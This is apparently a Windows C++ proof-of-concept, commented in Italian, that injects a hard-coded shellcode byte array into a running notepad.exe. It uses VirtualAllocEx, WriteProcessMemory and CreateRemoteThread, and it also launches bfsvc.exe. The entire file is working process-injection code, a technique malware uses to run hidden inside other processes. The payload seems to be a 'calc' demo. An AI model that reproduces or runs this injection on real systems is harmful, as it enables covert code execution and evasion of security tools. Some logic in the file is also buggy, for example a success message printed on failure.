#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <strsafe.h>

unsigned char payload[] = "\xeB\x02\xBA\xC7\x93"
                            "\xBF\x77\xFF\xD2\xCC"
                            "\xE8\xF3\xFF\xFF\xFF"
                            "\x63\x61\x6C\x63";

HANDLE FindTargetProcess(const char *processName){

    int pid = 0x0;

    // Crea uno snapshot di cio`che e`in esecuzione nel computer in questo momento
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x0);

    if(INVALID_HANDLE_VALUE == hSnap){
        return 0x0;
    }

    // Crea un'entrata per la lista dei processi che risiede nella macchina
    PROCESSENTRY32 processListEntry;
    processListEntry.dwSize = sizeof(PROCESSENTRY32);

    // Se c'e' una lista di processi vuota o non esistente nello snapshot
    if(!Process32First(hSnap, &processListEntry)){
        CloseHandle(hSnap);
        return 0x0;
    }

    // Itera tutti i process
    while(Process32Next(hSnap, &processListEntry)){
        // Se troviamo il processo che cerchiamo
        if(lstrcmpiA(processName, processListEntry.szExeFile) == 0x0){
            // Prendiamo il suo PID
            pid = processListEntry.th32ProcessID;
            break;
        }
    }

    CloseHandle(hSnap);

    // Ritorna un'handle al processo bersaglio
    if(pid){
        printf("Notepad.exe PID = %d\n", pid);
        return OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
    }

    return NULL;
}

// Inietta il payload nella memoria del processo bersaglio e lo esegue nel thread remoto.
int InjectPayload(HANDLE hProcess, unsigned char *payload, unsigned int payloadSize){

    LPVOID pRemoteShellcode = NULL;
    pRemoteShellcode = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);

    WriteProcessMemory(hProcess, pRemoteShellcode, (PVOID) payload, (SIZE_T) payloadSize, (SIZE_T *) NULL);

    HANDLE hThread = NULL;
    hThread = CreateRemoteThread(hProcess, NULL, 0x0, (LPTHREAD_START_ROUTINE) pRemoteShellcode, NULL, 0x0, NULL);


    if(hThread != NULL){
        printf("[+] InjectPayload - hThread NOT NULL");
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0x0;
    }

    return -0x1;
}

// Crea un processo
int launchProcess(char *processPath){
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if(!CreateProcess(NULL, processPath, NULL, NULL, FALSE, 0x0, NULL, NULL, &si, &pi)){
        printf("[+] %s process created", processPath);
        return -0x1;
    }
    WaitForSingleObject(pi.hProcess, 500);
    return 0x0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdLine, int mCmdShow){

    HANDLE hProcess = NULL;
    unsigned int payloadSize = sizeof(payload);

    // Ottiene handle al processo
    hProcess = FindTargetProcess("notepad.exe");

    launchProcess("C:\\Windows\\bfsvc.exe");

    if(hProcess != NULL){
        InjectPayload(hProcess, payload, payloadSize);
        int test;
        std::cin >> test;
        CloseHandle(hProcess);
    }

    return 0x0;
}